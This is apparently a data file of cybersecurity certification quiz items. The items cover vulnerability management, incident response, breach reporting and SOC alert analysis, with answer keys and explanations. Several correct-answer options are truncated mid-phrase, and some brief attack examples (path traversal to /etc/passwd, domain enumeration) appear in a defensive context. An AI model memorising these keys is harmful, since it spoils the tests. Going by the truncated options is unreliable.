    {q:"Reverse engineering assists vulnerability management by:",cat:"Vulnerability Management",opts:["Replacing penetration testing","Automating vulnerability scanning","Speeding up patch deployment","Analyzing malware or closed-source applications"],ans:3,why:"Reverse engineering compiled code helps analysts understand exactly how malware exploits vulnerabilities, identify vulnerable code patterns in proprietary software, and develop precise detection signatures.",ww:["RE complements pen testing — it doesn't replace it.","RE provides deep insight into how vulnerabilities work — scanners find known ones.","RE is analysis work — it doesn't speed deployment.",""],key:"Reverse engineering = understand how exploits work, analyze closed-source vulns, develop detection signatures."},
    {q:"Exploitability and weaponization in CVSS context refers to:",cat:"Vulnerability Management",opts:["The number of affected systems","The severity of potential data loss","Whether functional exploit code exists and is","Whether the vulnerability is known to security"],ans:2,why:"Weaponized vulnerabilities (existing public exploit code, included in Metasploit, actively used by threat actors) have dramatically higher real-world risk than theoretical vulnerabilities with no known exploitation.",ww:["Affected system count is asset management data.","Data loss severity is measured by Impact metrics.","","Research awareness is different from exploitation availability."],key:"Weaponized vuln = public exploit exists. Much higher real risk than CVSS alone shows. Check EPSS."},
    {q:"The Zed Attack Proxy (ZAP) by OWASP is used for:",cat:"Vulnerability Management",opts:["Network host discovery","Log correlation","Web application security testing","Binary analysis"],ans:2,why:"ZAP is an open-source, OWASP-maintained web application security testing tool that acts as a man-in-the-middle proxy — intercepting browser traffic to discover and test for injection flaws, broken authentication, and other OWASP Top 10 issues.",ww:["Host discovery uses Nmap or Angry IP Scanner.","Log correlation uses SIEM tools.","","Binary analysis uses debuggers like GDB."],key:"ZAP = open-source web app testing proxy. OWASP-maintained. Intercept + test HTTP traffic."},
    {q:"Broken access control vulnerabilities can be mitigated by:",cat:"Vulnerability Management",opts:["Encrypting all traffic","Implementing proper server-side authorization","Using stronger passwords","Increasing logging verbosity"],ans:1,why:"Broken access control requires server-side authorization enforcement — never trusting client-side controls, implementing proper role-based access, using deny-by-default policies, and testing all authorization paths.",ww:["Encryption protects data in transit — not authorization decisions.","","Passwords are authentication — broken access control is authorization.","Logging detects access violations — doesn't prevent them."],key:"Fix broken access control = server-side authorization for every request. Deny by default. Never trust client."},
    {q:"End-of-life components increase vulnerability risk because:",cat:"Vulnerability Management",opts:["They run faster","They have higher CVSS scores by definition","They cost more","The vendor no longer releases security patches"],ans:3,why:"EOL software (unsupported OS, deprecated libraries, discontinued applications) receives no security updates — any newly discovered vulnerabilities will remain unpatched indefinitely, increasing risk over time.",ww:["EOL components often have performance limitations.","EOL doesn't automatically change CVSS scores — but unpatched vulns accumulate.","EOL components are often cheaper to keep than replace — the risk is security.",""],key:"EOL = no more patches. Vulnerabilities accumulate permanently. Replace or apply compensating controls."},
    {q:"Cross-site request forgery (CSRF) is primarily prevented by:",cat:"Vulnerability Management",opts:["Anti-CSRF tokens (synchronizer token pattern)","Input validation on forms","Parameterized queries","Output encoding of user input"],ans:0,why:"CSRF protection requires per-session anti-CSRF tokens embedded in forms that the server validates, combined with SameSite=Strict or Lax cookie attributes that prevent cross-site requests from including session cookies.",ww:["","Input validation prevents injection — not CSRF.","Parameterized queries prevent SQLi — not CSRF.","Output encoding prevents XSS — not CSRF."],key:"CSRF prevention = anti-CSRF tokens + SameSite cookie attribute. Both layers together."},
    {q:"Directory traversal attacks attempt to:",cat:"Vulnerability Management",opts:["Overflow memory buffers","Inject SQL commands","Access files outside the web root by","Execute scripts in the browser"],ans:2,why:"Directory traversal (path traversal) uses sequences like ../../ in file path parameters to navigate above the web root directory and access sensitive system files like /etc/passwd, configuration files, or source code.",ww:["Memory overflow is buffer overflow — not path traversal.","SQL commands are SQL injection — not path traversal.","","Script execution in browser is XSS — not path traversal."],key:"Directory traversal = ../../ to escape web root. Access /etc/passwd, config files. Validate and canonicalize paths."},
    {q:"Identification and authentication failures (formerly Broken Authentication) in OWASP Top 10 include:",cat:"Vulnerability Management",opts:["Weak passwords, missing MFA, session token exposure,","Only SQL injection","Only CSRF attacks","Only XSS vulnerabilities"],ans:0,why:"Authentication failures cover a range of weaknesses — allowing weak passwords, not enforcing MFA, exposing session tokens in URLs, lacking brute-force protection, and improper session invalidation on logout.",ww:["","SQL injection is a separate OWASP category.","CSRF is a separate vulnerability class.","XSS is a separate OWASP category."],key:"Auth failures = weak passwords + missing MFA + token exposure + no brute-force protection + session issues."},
    {q:"Local File Inclusion (LFI) vulnerabilities allow attackers to:",cat:"Vulnerability Management",opts:["Intercept network traffic","Upload files to the server","Inject SQL into databases","Include and potentially execute local server"],ans:3,why:"LFI occurs when user input is used to include local files without proper validation — attackers can read sensitive files (/etc/passwd, application configs) or, in certain conditions, achieve code execution via log poisoning.",ww:["Traffic interception is a network attack.","File upload is a different vulnerability class.","SQL injection is a separate vulnerability.",""],key:"LFI = include local server files via unvalidated path input. Read configs, logs; potentially execute code."},
    {q:"Remote File Inclusion (RFI) is more dangerous than LFI because:",cat:"Vulnerability Management",opts:["It requires database access","RFI","It is harder to detect","It only works on Windows"],ans:1,why:"RFI allows the server to fetch and execute a file from an attacker-controlled URL — directly enabling remote code execution without requiring the attacker to have any files on the target server.",ww:["RFI exploits file inclusion functions — not database access.","","RFI is actually easier to detect due to external network connections.","RFI works on PHP and other interpreted languages on any OS."],key:"RFI = include attacker's remote URL = remote code execution. More dangerous than LFI."},
    {q:"Privilege escalation vulnerabilities allow attackers to:",cat:"Vulnerability Management",opts:["Authenticate to the system","Exfiltrate data faster","Scan for other vulnerabilities","Gain higher permissions than initially granted"],ans:3,why:"Privilege escalation (vertical) allows attackers to gain elevated access — from regular user to administrator or SYSTEM level — giving them full system control. Horizontal escalation accesses peer accounts.",ww:["Authentication is a different phase — escalation assumes the attacker is already authenticated.","Exfiltration speed is separate from privilege level.","Scanning is reconnaissance — not privilege escalation.",""],key:"Privilege escalation = gain higher permissions. Vertical (user→admin) or horizontal (user→user). Critical for attacker progression."},
    {q:"Security misconfiguration as an OWASP Top 10 risk includes:",cat:"Vulnerability Management",opts:["Default credentials","Only outdated software","Only SQL injection","Only XSS"],ans:0,why:"Security misconfiguration is the most common OWASP risk — default credentials left unchanged, unnecessary services enabled, S3 buckets publicly accessible, missing HTTP security headers, and error messages revealing stack traces.",ww:["","Outdated software is 'Vulnerable and Outdated Components' — misconfiguration is broader.","SQL injection is a separate OWASP category.","XSS is a separate OWASP category."],key:"Security misconfiguration = defaults left + unnecessary features + overly permissive + no hardening."},
    {q:"Data poisoning as a vulnerability refers to:",cat:"Vulnerability Management",opts:["Deleting database records","Malicious manipulation of training data","Encrypting data without permission","Injecting bad data into databases only via SQL"],ans:1,why:"Data poisoning attacks corrupt data that systems rely on — AI/ML training data poisoning manipulates model behavior, DNS cache poisoning redirects traffic, and ARP cache poisoning enables MITM attacks.",ww:["Deletion is destructive — poisoning manipulates data to cause incorrect behavior.","","Encryption of data is ransomware — not data poisoning.","SQL injection is a specific mechanism — data poisoning is a broader category."],key:"Data poisoning = corrupt relied-upon data. ML training, DNS cache, ARP cache are all targets."},
    {q:"Insecure design vulnerabilities differ from implementation bugs because:",cat:"Vulnerability Management",opts:["They are the same","Implementation bugs are always more severe","Insecure design only affects old systems","Insecure design means the architecture itself"],ans:3,why:"Insecure design (OWASP Top 10 #4) means security was not designed in from the start — the architecture lacks security controls by design, not just implementation mistakes. These require redesign, not just patching.",ww:["Design flaws are architectural — implementation bugs are coding errors.","Design flaws require redesign — more fundamental than implementation bugs.","Insecure design affects any system regardless of age.",""],key:"Insecure design = architectural flaw. Even perfect code of a bad design is insecure. Requires redesign."}
  ],
  "cs3_incident_response_c3": [
    {q:"The OSSTMM (Open Source Security Testing Methodology Manual) human security testing channel covers:",cat:"Incident Response",opts:["Binary reverse engineering","Social engineering","Cloud infrastructure assessment","Network protocol analysis"],ans:1,why:"OSSTMM's human security channel tests the human element — susceptibility to social engineering, physical access controls, and personnel security procedures — alongside technical channels.",ww:["Binary RE is a technical analysis technique — not OSSTMM human channel.","","Cloud assessment is OSSTMM's data network channel.","Network analysis is OSSTMM's network channel — not human."],key:"OSSTMM human channel = social engineering + physical access + personnel security testing."},
    {q:"During incident response, data and log analysis should prioritize:",cat:"Incident Response",opts:["Only firewall logs","The most recent logs only","Logs from systems near the suspected entry","Only endpoint logs"],ans:2,why:"Log analysis starts at the suspected entry point and follows the attack forward — authentication logs, then lateral movement systems, then data access logs — building the complete attack timeline.",ww:["Multiple log sources must be correlated — not just firewall.","Recent logs may miss the initial compromise that occurred days earlier.","","Endpoint logs are critical but must be combined with network and authentication logs."],key:"Log analysis: start at entry point, follow lateral movement, reconstruct full timeline."},
    {q:"Forensic analysis examining deleted files uses:",cat:"Incident Response",opts:["Only backup restoration","Standard file copy commands","Log file analysis","File carving and unallocated space analysis to"],ans:3,why:"File carving searches raw disk sectors for file signatures (magic bytes) to recover deleted files whose directory entries have been overwritten — a standard forensic technique for recovering attacker-deleted evidence.",ww:["Backups may not contain the deleted malicious files.","Standard copy can't see deleted file data.","Log analysis won't show file content — carving recovers the actual files.",""],key:"File carving = recover deleted files from unallocated space using file signatures. Standard forensic technique."},
    {q:"Indicators of compromise (IoC) application means:",cat:"Incident Response",opts:["Searching the organization's environment for","Creating new IoC databases","Reporting IoCs to law enforcement","Collecting IoCs from threat feeds"],ans:0,why:"IoC application is the hunting phase — taking collected IoCs (file hashes, IPs, domains, registry keys) and systematically searching logs, SIEM, EDR, and network data to find evidence of compromise in the environment.",ww:["","IoC databases are the intelligence source — application is the search.","Law enforcement reporting is a separate process.","Collection is a separate phase — application is the hunting phase."],key:"IoC application = hunt your environment for matches. Search logs + EDR + network for known-bad indicators."},
    {q:"Adversary emulation in incident response preparation tests:",cat:"Incident Response",opts:["Regulatory compliance","Whether the organization's detection and","Physical security only","Only web application vulnerabilities"],ans:1,why:"Adversary emulation simulates a specific threat actor's kill chain — using their known tools and techniques — to test whether the IR team's detection rules and response procedures would catch that actor's methods.",ww:["Adversary emulation tests operational capability — not just compliance.","","Physical security testing is a subset — adversary emulation tests the full kill chain.","Adversary emulation tests the full attack lifecycle — not just web apps."],key:"Adversary emulation = simulate specific threat actor to test if your defenses would detect them."},
    {q:"Business impact analysis (BIA) in disaster recovery planning identifies:",cat:"Incident Response",opts:["Network vulnerabilities","Physical office requirements","Critical business functions","Employee satisfaction scores"],ans:2,why:"BIA systematically identifies what the business cannot function without — mapping critical processes to their IT dependencies, setting maximum tolerable downtime, and quantifying the cost of disruption to prioritize recovery.",ww:["Network vulnerabilities are identified by vulnerability scanning.","Physical requirements are facilities management.","","Employee satisfaction is HR."],key:"BIA = map critical processes + dependencies + RTO/RPO + disruption cost. Foundation for DR planning."},
    {q:"The OWASP Testing Guide's authentication testing module checks for:",cat:"Incident Response",opts:["SQL injection vulnerabilities","Buffer overflow vulnerabilities","Network port exposure","Weak credentials, missing account lockout,"],ans:3,why:"OWASP authentication testing systematically checks for default credentials, missing lockout after failed attempts, credentials sent over unencrypted connections, and improperly managed session tokens.",ww:["SQL injection is a separate OWASP module.","Buffer overflow is memory testing — not OWASP authentication testing.","Network exposure is assessed by network scanning — not OWASP testing guide.",""],key:"OWASP auth testing: default creds + lockout + HTTPS + session management. Complete authentication assessment."},
    {q:"Re-imaging vs malware removal: re-imaging is chosen when:",cat:"Incident Response",opts:["The system is a development workstation only","The system hosts critical data","Time is critical and reimaging takes too long","The infection is minor and localized"],ans:1,why:"For high-value systems, critical infrastructure, or when rootkits are suspected, reimaging provides certainty that no attacker code remains. The extra time investment is justified by the security assurance.",ww:["Development workstations can also harbor persistent malware that spreads to production.","","High-value systems are worth the extra time for the assurance reimaging provides.","Even minor infections on critical systems may warrant reimaging."],key:"Reimaging choice: critical systems + suspected rootkits + uncertainty about cleanup = reimage for certainty."},
    {q:"The CSIRT (Cybersecurity Incident Response Team) differs from a general SOC because:",cat:"Incident Response",opts:["CSIRT is an external service always","CSIRT is specifically organized and trained to","CSIRT only monitors","CSIRT only handles phishing"],ans:1,why:"CSIRT has dedicated incident response expertise — forensics, malware analysis, legal coordination, regulatory communication, and executive briefing capabilities — beyond the monitoring and alerting focus of a general SOC.",ww:["CSIRTs can be internal or external.","","CSIRT actively responds — monitoring is the SOC's primary function.","CSIRT handles all incident types — not just phishing."],key:"CSIRT = specialized IR team. Forensics + coordination + legal + comms. Beyond SOC monitoring."},
    {q:"Tabletop exercises expose which type of IR weakness most effectively?",cat:"Incident Response",opts:["Network configuration errors","Physical access weaknesses","Technical tool failures","Gaps in decision-making"],ans:3,why:"Tabletops reveal organizational and procedural failures — unclear escalation paths, communication gaps between teams, uncertain decision authority, and coordination breakdowns — which technical exercises cannot expose.",ww:["Network configuration errors are found by technical assessment.","Physical weaknesses require physical testing.","Technical tool failures are found by actual system testing — not discussion exercises.",""],key:"Tabletops expose: unclear escalation + communication gaps + decision authority + coordination failures."},
    {q:"During the recovery phase, validation ensures:",cat:"Incident Response",opts:["That restored systems are functioning correctly","Only that systems are powered on","That all employees are notified","That the incident report is filed"],ans:0,why:"Recovery validation confirms multiple conditions — systems operational, the exploited vulnerability patched, forensic scans showing no remaining malware, enhanced monitoring in place, and business functionality confirmed.",ww:["","Simply being powered on doesn't mean secure recovery.","Employee notification is a communication step — recovery validation is technical.","Reports are separate from technical recovery validation."],key:"Recovery validation = functional + patched + clean + monitored. Confirm all four before closing recovery phase."},
    {q:"The preparation phase activity of 'tabletop' specifically tests:",cat:"Incident Response",opts:["Firewall configurations","Employee phishing awareness","Vulnerability scanning procedures","The IR team's response to a simulated scenario"],ans:3,why:"Tabletop exercises walk the IR team through a simulated incident scenario in a conference room setting — asking 'what would you do if...' to identify gaps in plans, processes, communication, and decision-making.",ww:["Firewall testing is technical — tabletop is discussion.","Phishing testing is a separate exercise (simulated phishing campaign).","Vuln scanning procedures are tested through actual scans.",""],key:"Tabletop = structured discussion of 'what would you do if...' Finds plan and process gaps."}
  ],
  "cs3_reporting_comms_c3": [
    {q:"Vulnerability management metrics should be reported to different stakeholder groups because:",cat:"Reporting & Communication",opts:["Only IT leadership needs vulnerability data","Regulators require different formats","All stakeholders want the same data","Technical teams need vulnerability details;"],ans:3,why:"Information needs differ by audience — SOC analysts need IoCs and CVE details, system owners need their specific exposures, CISOs need program KPIs, executives need business risk, and boards need strategic risk trends.",ww:["Business leaders and risk owners also need vulnerability information.","Regulatory formatting is a compliance requirement separate from audience needs.","Different roles require different levels of detail and framing.",""],key:"Tailor vuln reports by audience: analysts = CVE detail, owners = system exposure, execs = business risk."},
    {q:"A memorandum of understanding (MOU) as a remediation inhibitor typically applies when:",cat:"Reporting & Communication",opts:["The patch is not yet available","The system is outdated","Only government systems are involved","Two or more organizations share a system and"],ans:3,why:"MOUs between organizations define mutual agreements about shared systems — if two agencies or companies jointly operate a system, an MOU may require joint change approval, slowing independent patching.",ww:["Patch availability is a separate inhibitor category.","System age is the legacy system inhibitor category.","MOUs can apply to any inter-organizational shared system.",""],key:"MOU inhibitor = shared system requires joint organizational approval. One party cannot unilaterally patch."},
    {q:"Alert volume as a KPI should be analyzed alongside false positive rate because:",cat:"Reporting & Communication",opts:["They are identical","High alert volume with high false positive rate","False positive rate is not measurable","Alert volume is always accurate"],ans:1,why:"Alert volume without quality context can be misleading — 10,000 alerts with 99% false positives represents a tuning problem, not high threat activity. Both metrics together show whether the SOC is drowning in noise.",ww:["Alert volume and false positive rate measure different things.","","False positive rate is measurable and a critical SOC metric.","High alert volume can be a tuning problem — not necessarily real threats."],key:"Alert volume + false positive rate together = signal quality assessment. Volume alone is misleading."},
    {q:"Executive summaries in incident reporting should avoid:",cat:"Reporting & Communication",opts:["Recommendations","Business impact information","Timeline of major events","Technical jargon"],ans:3,why:"Executives make resource and policy decisions — they need to understand business impact, what was done, what it costs, and what changes are needed. CVEs, CVSS scores, and technical exploit details are not useful for their decision-making.",ww:["Recommendations are essential for executive summaries.","Business impact is the core of executive summaries.","A high-level timeline is appropriate for executives.",""],key:"Executive summary: business impact + timeline + recommendations. No CVEs, shellcode, or technical depth."},
    {q:"Incident response reporting recommendations should focus on:",cat:"Reporting & Communication",opts:["Specific, actionable improvements with assigned owners,","Only regulatory compliance","Only technical controls","Historical incidents only"],ans:0,why:"Effective IR recommendations are specific — 'implement MFA on VPN by Q2, owner: CISO, success metric: 100% enforcement' — rather than vague suggestions that no one implements because no one is accountable.",ww:["","Security improvements drive compliance — but recommendations should address all gaps.","Recommendations should span technical, process, and human factors.","Forward-looking recommendations prevent recurrence — not just documenting history."],key:"IR recommendations = specific + owner + timeline + success metric. Vague suggestions don't get implemented."},
    {q:"Scope in an incident response report documents:",cat:"Reporting & Communication",opts:["The financial budget for response","The attacker's tools","Only the initially compromised system","The breadth of the incident"],ans:3,why:"Scope documentation provides a comprehensive map of impact — all affected systems, data repositories accessed, networks traversed, business processes disrupted, and user accounts compromised — enabling complete remediation.",ww:["Budget is a financial concern — scope is the technical breadth.","Attacker tools are in the technical analysis — scope is about affected systems.","Scope documents all affected systems — not just the initial one.",""],key:"Scope = complete map of impact. Every affected system, dataset, network, process, and account."},
    {q:"Customer communication during a breach should:",cat:"Reporting & Communication",opts:["Be avoided to prevent panic","Be delayed until full forensic analysis is","Include full technical details","Be timely, accurate, and provide actionable"],ans:3,why:"Customer notifications must balance legal timing requirements, accuracy (not communicating unverified information), and actionability (tell customers what steps to take to protect themselves, like changing passwords).",ww:["Notification may be legally required and builds trust when done well.","Legal timelines often require notification before forensics are complete.","Customers need actionable guidance — not full technical details.",""],key:"Customer notification = timely + accurate + actionable + legally compliant. Tell them what to do."},
    {q:"When incidents involve potential litigation, communications should be:",cat:"Reporting & Communication",opts:["Shared with all employees for transparency","Destroyed to protect the organization","Reviewed by legal counsel before external","Posted publicly as soon as possible"],ans:2,why:"When litigation is possible, every communication is potential evidence — legal review prevents statements that could be used against the organization, and document retention policies must be followed (legal hold).",ww:["Broad internal disclosure can create discovery risks in litigation.","Destroying communications is spoliation — potentially illegal.","","Premature public disclosure can harm legal positioning."],key:"Litigation = legal review all comms + follow document retention + legal hold on relevant evidence."},
    {q:"The 'recommendations' section of an incident report addresses:",cat:"Reporting & Communication",opts:["Specific changes to prevent recurrence and","The attacker's future plans","Only historical facts","Only what happened during the incident"],ans:0,why:"Recommendations transform incident findings into a forward-looking improvement roadmap — specific security control changes, process improvements, additional training, or technology investments that address the root causes identified.",ww:["","Attacker intentions are attribution and threat intel — not incident recommendations.","Recommendations are future-focused — not historical documentation.","What happened is in the incident narrative — recommendations are forward-looking."],key:"Recommendations = forward-looking prevention. Specific controls + process + training + technology to prevent recurrence."},
    {q:"Mean time to remediate (MTTRem) tracking over multiple reporting periods reveals:",cat:"Reporting & Communication",opts:["Whether the remediation process is becoming","Individual analyst skill levels","Only the last incident's metrics","The cost of each patch"],ans:0,why:"Trending MTTRem over time reveals program health — improving times show process maturity, stagnant times show resource constraints, and degrading times may indicate growing technical debt or team overload.",ww:["","MTTRem trend is about process efficiency — not individual performance.","Trend analysis requires multiple periods — not just the last one.","Patch cost is a financial metric."],key:"MTTRem trend = program health indicator. Improving = maturing. Degrading = technical debt or resource issues."},
    {q:"Stakeholder communication during an incident should be governed by:",cat:"Reporting & Communication",opts:["Social media trends","Whoever wants to communicate first","Only the CISO's personal judgment","A pre-defined communication plan specifying who"],ans:3,why:"Pre-defined communication plans prevent confusion, contradictory messages, and unauthorized disclosures — establishing clear roles, approved channels, pre-vetted message frameworks, and escalation paths for each stakeholder group.",ww:["Social media is inappropriate for formal incident communications.","Ad hoc communication leads to inconsistent messages and potential legal exposure.","The CISO needs a plan — not just individual judgment.",""],key:"Communication plan = pre-defined who + what + to whom + channel + when. Prevents contradictory messages."},
    {q:"Regulatory reporting of a breach differs from customer notification in that:",cat:"Reporting & Communication",opts:["Regulatory reporting goes to government agencies with required details","Regulatory reporting is optional","They are identical obligations","Customer notification is always required first"],ans:0,why:"Regulatory notification (to DPA for GDPR, OCR for HIPAA, state AG for state breach laws) uses specific regulatory forms and requires different information than customer notification letters.",ww:["","Regulatory reporting is mandatory — not optional.","They are distinct obligations with different audiences and content requirements.","Order of notification depends on the specific regulation."],key:"Regulatory notification = to government agencies with required technical content. Different from customer letters."}
  ],
  "security_ops_d4": [
    {q:"A SOC analyst reviews SIEM alerts and notices process 'svchost.exe' is making outbound HTTPS connections to an IP in a country where the company has no business. The parent process is 'explorer.exe'. What is the MOST likely explanation?",cat:"Security Operations",opts:["Normal Windows update behavior","Normal DNS resolution","Process hollowing","A misconfigured proxy server"],ans:2,why:"svchost.exe should be spawned by services.exe, not explorer.exe. A svchost spawned by explorer making outbound connections to foreign IPs strongly indicates process injection or a masquerading malware using the trusted system process name.",ww:["Windows updates come from Microsoft IPs via svchost under services.exe — not explorer.","DNS uses port 53 — not HTTPS to foreign IPs.","","Proxy misconfig creates different traffic patterns."],key:"Wrong parent process (explorer→svchost) + unusual external connections = process injection or masquerading."},
    {q:"An analyst is reviewing Zeek logs and sees hundreds of DNS queries per minute to randomly generated domain names (e.g., xjk92m.evil.com, p8n3qr.evil.com). What technique does this indicate?",cat:"Security Operations",opts:["Domain Generation Algorithm (DGA)","Normal DNS load balancing","A DDoS attack against DNS servers","Normal CDN domain rotation"],ans:0,why:"DGA malware generates hundreds of pseudo-random domain names daily — only one (known to the attacker) resolves. This evades blacklisting since the domains change constantly. High-volume random-looking DNS queries are the signature.",ww:["","Load balancing uses consistent known domain pools.","DDoS against DNS sends queries to authoritative servers — DGA queries come from the infected host.","CDN domains are human-readable and consistent."],key:"DGA = hundreds of random subdomain queries. Malware tries them all to find live C2. Block with DNS sinkholing."},
    {q:"During threat hunting, an analyst finds that PowerShell.exe spawned cmd.exe, which spawned net.exe with arguments 'net user /domain'. The process tree was initiated by a phishing email macro. Which ATT&CK technique is MOST relevant?",cat:"Security Operations",opts:["T1566 Phishing (initial access)","T1078 Valid Accounts","T1087 Account Discovery","T1059 Command and Scripting Interpreter"],ans:2,why:"After initial access via phishing macro (T1566), the subsequent 'net user /domain' command is Account Discovery (T1087) — the attacker mapping domain users to identify targets for lateral movement or privilege escalation.",ww:["Phishing is the initial access technique — account discovery is the post-access activity being analyzed.","Valid accounts technique is about using stolen credentials — this is enumeration.","","T1059 is the scripting interpreter technique — the specific action is account enumeration."],key:"Process chain: macro→PS→cmd→net.exe /domain = Account Discovery (T1087) post-phishing initial access."},
    {q:"An IDS alert fires on a signature matching a known exploit. The analyst investigates and finds the target system is running a fully patched version of the software. What is this alert MOST likely?",cat:"Security Operations",opts:["A false positive","A true positive requiring immediate escalation","A critical zero-day","Evidence of successful exploitation"],ans:0,why:"If the target system is fully patched and the vulnerability is fixed, the IDS alert is likely a false positive — the signature matched the traffic pattern but the system is not actually exploitable. Requires vulnerability context to validate.",ww:["","A fully patched system cannot be exploited by a patched vulnerability.","Zero-days are unknown vulnerabilities — this is a known patched one.","Successful exploitation would require an unpatched system."],key:"IDS alert + fully patched target = likely false positive. Always validate exploitability with patch status."},
    {q:"A threat intelligence report indicates an APT group uses a specific PowerShell obfuscation technique involving character replacement. Which detection approach is MOST effective?",cat:"Security Operations",opts:["Only signature-based antivirus","Implement PowerShell Script Block Logging to","Block all PowerShell execution","Disable PowerShell remoting"],ans:1,why:"PowerShell Script Block Logging (Event ID 4104) captures the deobfuscated script content as PowerShell executes it — seeing what the script actually does regardless of obfuscation technique used.",ww:["Signature-based AV cannot detect novel obfuscation patterns — behavioral detection is needed.","","Blocking all PowerShell would break legitimate administration.","Remoting and local execution are separate — remoting restriction doesn't stop local obfuscated scripts."],key:"PowerShell Script Block Logging (Event 4104) = captures deobfuscated content at execution. See through obfuscation."},
    {q:"An analyst notices a legitimate admin tool (PSExec) being used to move laterally to 15 systems within 4 minutes. The account is a valid service account. What MOST describes this activity?",cat:"Security Operations",opts:["Normal system administration","Living Off the Land (LOLBin) attack","A scheduled script deployment","Normal backup agent behavior"],ans:1,why:"Attackers use legitimate admin tools (PSExec, WMI, PsRemoting) to move laterally — the tools themselves are trusted and bypass many detections. Speed (15 systems in 4 minutes) and use of a service account indicate attacker activity.",ww:["Normal admin operations don't hit 15 systems in 4 minutes without scheduled automation.","","Script deployments are documented and expected — unexpected lateral use of a service account is not.","Backup agents operate on consistent known schedules."],key:"LOLBin lateral movement = legitimate tool + abnormal speed + unusual account = attacker TTPs."},
    {q:"While reviewing network flow data, an analyst spots a host sending exactly 500 bytes of data to an external IP every 3600 seconds consistently for 3 days. The destination is a new domain registered 2 weeks ago. What BEST describes this?",cat:"Security Operations",opts:["A misconfigured monitoring agent","Normal NTP synchronization","Normal software license check","C2 beacon with periodic check-in"],ans:3,why:"The combination of consistent exact interval (3600s), constant payload size (500 bytes), and a recently registered domain perfectly matches C2 beaconing behavior — automated malware check-ins look exactly like this.",ww:["Monitoring agents use known management server domains — not recently registered ones.","NTP uses UDP port 123 to well-known time servers — not custom domains.","License checks are infrequent and use vendor domains — not newly registered ones.",""],key:"Consistent interval + fixed payload size + new domain = textbook C2 beacon. Investigate immediately."},
    {q:"A security analyst receives an alert: 'LSASS.exe accessed by Mimikatz.exe'. Upon investigation, the process is named 'svchost.exe' but its executable path is C:\\Users\\Public\\svchost.exe. What is happening?",cat:"Security Operations",opts:["A Windows update component","A legitimate memory diagnostic","A legitimate Windows process","Masquerading"],ans:3,why:"Legitimate Windows processes run from C:\\Windows\\System32 — a process named svchost.exe running from C:\\Users\\Public\\ is malware masquerading. Combined with LSASS access, this is a credential dumping attack.",ww:["Updates run from trusted Microsoft paths.","Memory diagnostics are Windows-signed from System32.","Legitimate svchost.exe runs from System32 — C:\\Users\\Public\\ is a red flag.",""],key:"Masquerading = trusted process name + wrong path. svchost from Users\\Public = credential dump attempt."},
    {q:"An analyst uses VirusTotal to check a file hash and gets 0/72 detections. However, the file was found only on one executive's laptop after a targeted spearphishing attack from a nation-state group. What should the analyst conclude?",cat:"Security Operations",opts:["The file may be a custom/novel malware not yet","Only run the file to see what it does","The incident is not serious","The file is definitely safe"],ans:0,why:"Nation-state APTs frequently use custom malware compiled specifically for a target — ensuring 0 AV detections. Zero detections on VirusTotal means only that no AV engine has a signature for it — not that it is safe.",ww:["","Running unknown files destroys forensic integrity and may cause harm.","Single-target APT attacks with custom tools are extremely serious.","0 AV detections means no known signature — not absence of malware."],key:"0 VirusTotal detections for targeted APT malware = custom tool. Need behavioral/sandbox analysis."},
    {q:"During log analysis, an analyst finds Event ID 4624 (successful logon) Type 3 (network logon) for a privileged account at 3 AM, followed by Event ID 4688 (new process creation) for net.exe, whoami.exe, and ipconfig.exe. What phase of the attack is this?",cat:"Security Operations",opts:["Post-compromise reconnaissance","Physical access phase","Exfiltration phase","Initial access phase"],ans:0,why:"Network logon with privileged credentials outside business hours, followed by enumeration commands (net, whoami, ipconfig), indicates an attacker with stolen credentials performing post-compromise reconnaissance to understand the environment.",ww:["","Network logon Type 3 is remote — not physical access.","Exfiltration would show large data transfers — enumeration commands are reconnaissance.","Initial access was when credentials were stolen — this is post-access activity."],key:"Event 4624 (Type 3) + 4688 (net/whoami/ipconfig) = attacker with stolen creds doing post-compromise recon."},
    {q:"A threat hunter notices DNS queries for 'windowsupdate.microsoft.com.evil.com' being made by workstations. What technique is being used?",cat:"Security Operations",opts:["Normal Windows update traffic","Normal CDN traffic","DNS tunneling or subdomain hijacking","A misconfigured hosts file"],ans:2,why:"'microsoft.com.evil.com' resolves to evil.com (the rightmost registered domain), not microsoft.com. Attackers craft subdomains that appear legitimate to casual inspection but actually route to their infrastructure.",ww:["Actual Windows Update queries go to windowsupdate.microsoft.com — not *.evil.com.","CDN uses actual Microsoft domains.","","Hosts file misconfiguration would redirect queries — not create new ones."],key:"DNS subdomain trick: legit.looking.stuff.attacker.com resolves to attacker.com. Read from right to left."},
    {q:"An analyst reviews SIEM and finds a user account that has been inactive for 6 months suddenly authenticating from a VPN, accessing HR, Finance, and Engineering file shares within 30 minutes. What should the analyst suspect FIRST?",cat:"Security Operations",opts:["Normal VPN access from a remote worker","Compromised dormant account","The user returned from extended leave","A network misconfiguration"],ans:1,why:"Long-dormant accounts suddenly becoming active with broad cross-department access is a classic indicator of a compromised credential — attackers find old accounts with less monitoring, crack or buy credentials, and use them.",ww:["Remote workers access their own resources — not HR + Finance + Engineering simultaneously.","","Returning employees typically access only their own resources — not cross-departmental within 30 minutes.","Network misconfiguration doesn't cause authentication events."],key:"Dormant account + sudden VPN + cross-department access = compromised old credential. Disable and investigate."},
    {q:"During incident response, memory forensics reveals a process with no disk image — the executable path shows [memory only]. What type of attack does this indicate?",cat:"Security Operations",opts:["A normal Windows service","Fileless malware","A corrupted disk","A Windows update in progress"],ans:1,why:"Fileless malware executes entirely in memory — often injected via PowerShell or macros — leaving no file on disk for traditional AV to detect. Memory forensics is required to identify and analyze it.",ww:["Windows services have disk-backed executables with proper paths.","","Corrupted disk doesn't create in-memory-only processes.","Update processes have legitimate disk-backed paths."],key:"Process with no disk image = fileless malware. Exists only in RAM. Requires memory forensics to detect."},
    {q:"An analyst receives a threat intel report indicating an adversary group uses 'Cobalt Strike' with a specific JARM fingerprint for its C2 servers. How can this intelligence BEST be operationalized?",cat:"Security Operations",opts:["Configure network monitoring to alert on TLS","Only update antivirus signatures","Archive the report for future reference","Block all Cobalt Strike downloads"],ans:0,why:"JARM fingerprints uniquely identify TLS server implementations — a specific Cobalt Strike JARM fingerprint can be detected in TLS handshakes, allowing proactive identification of adversary C2 infrastructure even without domain/IP IoCs.",ww:["","AV signatures detect files — JARM fingerprints detect network-level C2 infrastructure.","Archiving intelligence without acting on it wastes the value.","Blocking downloads doesn't detect existing infections."],key:"JARM fingerprint intelligence → configure TLS fingerprint detection in network monitoring. Proactive C2 detection."},
